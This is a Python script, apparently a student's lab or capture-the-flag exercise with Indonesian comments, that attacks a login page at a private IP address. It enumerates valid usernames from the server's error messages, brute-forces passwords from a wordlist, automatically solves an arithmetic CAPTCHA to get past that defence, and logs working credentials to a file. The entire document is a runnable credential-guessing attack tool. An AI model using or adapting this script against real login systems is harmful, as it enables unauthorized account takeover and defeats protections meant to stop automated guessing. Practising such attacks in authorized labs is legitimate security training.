# Febry Afriansyah
# 09011382126166

from requests import Session
import re, logging

# URL login target
url = "http://10.10.63.174/login"

# Mengatur logging ke file untuk mencatat hasil login yang berhasil
logging.basicConfig(filename='berhasil_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Membaca daftar username dan password, menghapus baris kosong
usernames = open('usernames.txt', 'r').read().splitlines()
passwords = open('passwords.txt', 'r').read().splitlines()

# Fungsi untuk menyelesaikan CAPTCHA
def solve_captcha(response):
    captcha_syntax = re.compile(r'\s*(\d+)\s*([+*-/])\s*(\d+)\s*=\s*\?')
    match = captcha_syntax.search(response)
    if match:
        num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
        if operator == '+':
            return num1 + num2
        elif operator == '-':
            return num1 - num2
        elif operator == '*':
            return num1 * num2
        elif operator == '/':
            return num1 / num2
    return None

# Inisialisasi sesi untuk menjaga sesi yang sama
session = Session()

# Tahap 1: Mencari username yang valid
valid_username = None
print("Mencari username yang valid...")

username_attempt_count = 0  # Menghitung jumlah percobaan untuk username

for user in usernames:
    data = {'username': user, 'password': 'dummy'}
    response = session.post(url, data=data)
    
    if 'Captcha enabled' in response.text:
        captcha_result = solve_captcha(response.text)
        if captcha_result is not None:
            data['captcha'] = captcha_result
            response = session.post(url, data=data)
    
    if 'does not exist' not in response.text:
        valid_username = user
        print(f'Username valid ditemukan: {valid_username}')
        break
    username_attempt_count += 1
    print(f'Percobaan {username_attempt_count}: Mencoba username: {user}')

# Jika tidak ada username yang valid, keluar dari program
if not valid_username:
    print("Tidak ada username yang valid ditemukan.")
    exit()

# Reset percobaan password count
password_attempt_count = 0  # Menghitung jumlah percobaan untuk password
print(f"Mencoba brute force password untuk username: {valid_username}")

for password in passwords:
    data = {'username': valid_username, 'password': password}
    response = session.post(url, data=data)
    
    if 'Captcha enabled' in response.text:
        captcha_result = solve_captcha(response.text)
        if captcha_result is not None:
            data['captcha'] = captcha_result
            response = session.post(url, data=data)

    if 'Error' not in response.text:
        print(f'Sukses! Username: {valid_username}, Password: {password}')
        logging.info(f'Sukses! Username: {valid_username}, Password: {password}')
        exit()
    else:
        password_attempt_count += 1
        print(f'Percobaan {password_attempt_count}: Mencoba password: {password} untuk username: {valid_username}')

print("Brute force selesai. Tidak ada password yang valid ditemukan.")
